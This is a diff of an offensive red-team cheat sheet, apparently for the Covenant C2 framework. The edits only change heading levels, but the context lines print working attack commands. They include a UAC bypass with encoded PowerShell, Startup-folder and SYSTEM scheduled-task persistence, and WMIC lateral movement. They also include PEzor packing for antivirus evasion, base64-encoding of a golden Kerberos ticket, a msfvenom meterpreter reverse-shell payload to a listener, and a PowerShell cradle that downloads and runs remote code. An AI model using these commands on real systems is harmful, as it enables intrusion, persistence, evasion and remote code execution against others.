@@ -189,7 +189,7 @@ BypassUACCommand cmd.exe "/c powershell -enc [...snip...]"
 
 # Persistence
 
-### Classic Startup folder
+###### Classic Startup folder
 
 Just drop a binary in current user folder, will trigger when current user signs in:
 
@@ -202,7 +202,7 @@ Or in the startup folder, requires administrative privileges but will trigger as
 "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
 ```
 
-### Schedule Tasks
+##### Schedule Tasks
 
 This PowerShell script will execute a new Grunt (using our existing PowerShell payload) every 4 hours for up to 30 days. If you omit the RepetitionDuration option in the trigger, it will repeat indefinitely.
 
@@ -240,7 +240,7 @@ schtasks /create /ru "SYSTEM" /tn "update" /tr "cmd /c c:\windows\temp\update.ba
 
 # Lateral Movement
 
-#### WMIC Lateral Movement
+##### WMIC Lateral Movement
 
 ```cpp
 wmic /node:"192.168.1.2" process call create "C:\Perflogs\434.bat"
@@ -250,7 +250,6 @@ WMIC /node:"DC.example.domain" process call create "rundll32 C:\PerfLogs\arti64.
 # MSSQL databases
 
 PowerUpSQL can be used to look for databases within the domain, and gather further information on databases.
-
 
 ```py
 # Get MSSQL databases in the domain, and test connectivity
@@ -283,26 +282,26 @@ Get-SqlServerLinkCrawl -Instance dcorp-mssql | select instance,links | ft
 
 # Misc & Encoding
 
-#### PeZOR Packing and Encoding 
+##### PeZOR Packing and Encoding 
 
 ```cpp
 PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=10 /root/Desktop/Grunt_Nim.exe -z 2
 ```
 
-#### Cat to base64 
+##### Cat to base64 
 
 ```cpp
 cat file.ps1 | iconv -t utf-16le | base64 -w 0
 powershell -Sta -Nop -Window Hidden -EncodedCommand <encodedCommand>
 ```
 
-#### Powershell to base64
+##### Powershell to base64
 
 ```cpp
 [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\IEUser\Desktop\golden.kirbi")) 
 ``` 
 
-#### Hex Encode 
+##### Hex Encode 
 
 ```
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.239 LPORT=4444 -f raw -o meter.bin
@@ -310,13 +309,13 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.239 LPORT=4444 -
 xxd -i encmeter.bin
 ```
 
-#### Default MSF bin
+##### Default MSF bin
 
 ```
 msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT="Proxy Loading worked!" -f raw > shellcode.bin
 ```
 
-#### PS memory 
+##### PS memory 
 
 ```powershell
 $string = "iex (New-Object Net.WebClient).DownloadString('http://<webServer>:8082/ps.ps1')"
